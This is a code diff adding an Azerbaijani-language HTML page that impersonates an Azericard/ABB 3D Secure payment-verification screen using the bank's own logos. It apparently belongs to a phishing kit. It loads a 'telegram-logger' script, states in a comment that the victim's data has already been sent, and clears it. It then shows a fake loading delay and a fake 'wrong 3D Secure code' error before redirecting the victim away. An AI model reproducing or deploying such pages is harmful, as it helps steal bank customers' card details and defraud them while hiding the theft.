@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Təhlükəsiz Ödəniş Təsdiqi - Azericard</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #0056b3;
+            --secondary-color: #e7f1ff;
+            --error-color: #dc3545;
+            --success-color: #28a745;
+            --text-color: #343a40;
+            --light-bg: #ffffff;
+            --border-radius: 8px;
+            --box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .all {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        
+        .main {
+            flex: 1;
+            padding: 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+        
+        .abb-logo img, .card-call img {
+            height: 40px;
+            object-fit: contain;
+        }
+        
+.card-call {
+  display: flex;
+  justify-content: space-around;
+  width: 100%;
+  overflow-x: auto; /* Allows horizontal scrolling if needed */
+  box-sizing: border-box;
+  gap: 10px; /* Space between images */
+}
+
+.card-call div {
+  flex: 0 0 auto; /* Prevents images from shrinking */
+  width: calc(33.333% - 7px); /* Each image takes up roughly 1/3 of container minus gap */
+  min-width: 100px; /* Prevents images from becoming too small */
+  object-fit: cover; /* Maintains image aspect ratio */
+}
+
+@media (max-width: 768px) {
+  .card-call {
+    justify-content: center;
+    padding: 0 10px;
+  }
+}
+
+        
+        .form-content {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            padding: 40px;
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+            transition: var(--transition);
+        }
+        
+.logo {
+  width: 150px;
+  height: auto;
+  object-fit: contain;
+}
+
+        
+        .verification-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .message {
+            font-size: 1.2rem;
+            color: var(--text-color);
+            margin: 20px 0;
+            font-weight: 500;
+        }
+        
+        .error {
+            color: var(--error-color);
+            font-size: 1.1rem;
+            background-color: rgba(220, 53, 69, 0.1);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            border-left: 4px solid var(--error-color);
+            margin: 20px 0;
+            text-align: left;
+            display: none;
+        }
+        
+        .status-icon {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        
+        .transaction-info {
+            background-color: var(--secondary-color);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            text-align: left;
+            width: 100%;
+        }
+        
+        .transaction-info p {
+            margin: 5px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .transaction-info .label {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+        
+        footer {
+            margin-top: 40px;
+            padding: 20px 0;
+            background-color: white;
+            border-radius: var(--border-radius) var(--border-radius) 0 0;
+            box-shadow: 0 -5px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .footer_1, .footer_2 {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 30px;
+            padding: 10px 0;
+        }
+        
+        .footer_1 img, .footer_2 img {
+            height: 30px;
+            object-fit: contain;
+            opacity: 0.7;
+            transition: var(--transition);
+        }
+        
+        .footer_1 img:hover, .footer_2 img:hover {
+            opacity: 1;
+        }
+        
+        .security-note {
+            text-align: center;
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: 20px;
+            padding: 0 20px;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .card-call {
+                justify-content: space-around;
+            }
+            
+            .form-content {
+                padding: 30px 20px;
+            }
+            
+            .footer_1, .footer_2 {
+                gap: 15px;
+            }
+            
+            .footer_1 img, .footer_2 img {
+                height: 25px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="all">
+        <main class="main">
+            <header>
+                <div class="card-call">
+                                    <a href="#">
+                    <div>
+                        <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Loqo">
+                    </div>
+                </a>
+                    <a href="#">
+                        <div>
+                            <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard">
+                        </div>
+                    </a>
+                </div>
+            </header>
+            
+            <section class="form-content">
+                <img class="logo" id="card-logo" src="images/visa.png" alt="Kart Növü">
+                
+                <div class="verification-container">
+                    <div class="spinner" id="loading-spinner"></div>
+                    
+                    <div class="message" id="processing-message">
+                        Zəhmət olmasa gözləyin, məlumatlarınız yoxlanılır...
+                    </div>
+                    
+                    <div class="transaction-info">
+                        <p><span class="label">Əməliyyat:</span> <span>Irshad</span></p>
+                        <p><span class="label">Tarix:</span> <span id="current-date-time">16/04/2025 12:00:00</span></p>
+                        <p><span class="label">Kart:</span> <span id="card-number">**** **** **** ****</span></p>
+                    </div>
+                    
+                    <div class="error" id="error-message">
+                        <i class="fas fa-exclamation-circle status-icon"></i>
+                        Təsdiqləmə uğursuz oldu: Yanlış 3D Secure kodu.
+                    </div>
+                </div>
+                
+                <div class="security-note">
+                    <i class="fas fa-shield-alt"></i> Bu səhifə, onlayn əməliyyatınızı təhlükəsiz etmək üçün 3D Secure texnologiyasından istifadə edir.
+                </div>
+            </section>
+        </main>
+        
+        <footer>
+            <div class="footer_1">
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="Visa">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="Secure">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="Mastercard">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="Mastercard Loqo">
+                </div>
+            </div>
+            <div class="footer_2">
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="American Express">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="SafeKey">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="UnionPay">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="JCB">
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="js/telegram-logger.js"></script>
+    <script>
+        // Cari vaxtı və tarixi göstər
+        function updateDateTime() {
+            const now = new Date();
+            const day = String(now.getDate()).padStart(2, '0');
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const year = now.getFullYear();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            
+            const formattedDateTime = `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
+            document.getElementById('current-date-time').textContent = formattedDateTime;
+        }
+        
+        // Səhifə yükləndikdə vaxtı göstər
+        updateDateTime();
+        
+        // URL-dən kart parametrlərini al
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+        
+        // Kart məlumatlarını al və göstər
+        const cardNumber = getParameterByName('card');
+        if (cardNumber) {
+            // Son 4 rəqəmi göstər, əvvəlini ulduzla əvəz et
+            const lastFour = cardNumber.slice(-4);
+            const maskedNumber = '**** **** **** ' + lastFour;
+            document.getElementById('card-number').textContent = maskedNumber;
+            
+            // Karta görə uyğun logo göstər
+            const cardType = (cardNumber.startsWith('4')) ? 'visa' : 
+                             (cardNumber.startsWith('5')) ? 'mastercard2' : 'card';
+            
+            document.getElementById('card-logo').src = 'images/' + cardType + '.png';
+            document.getElementById('card-logo').alt = cardType.charAt(0).toUpperCase() + cardType.slice(1);
+        }
+        
+        // İstifadəçinin gəldiyi səhifənin URL-ini al
+        const previousPage = document.referrer;
+
+        // Artıq məlumatlar göndərilib, sadəcə təmizləyək
+        if (window.TelegramLogger) {
+            console.log('🧹 Məlumatlar təmizlənir...');
+            // Clear data after a short delay
+            setTimeout(() => {
+                window.TelegramLogger.clearData();
+            }, 2000);
+        }
+
+        // 30 saniyə sonra xəta mesajını göstər
+        setTimeout(() => {
+            document.getElementById('loading-spinner').style.display = 'none';
+            document.getElementById('processing-message').style.display = 'none';
+            document.getElementById('error-message').style.display = 'flex';
+
+            // 5 saniyə sonra yönləndir
+            setTimeout(() => {
+                // Əgər əvvəlki səhifə varsa oraya yönləndir, yoxsa ana səhifəyə yönləndir
+                if (previousPage) {
+                    window.location.href = previousPage;
+                } else {
+                    window.location.href = "index.html"; // Varsayılan səhifə
+                }
+            }, 5000);
+        }, 30000);
+    </script>
+</body>
+</html>
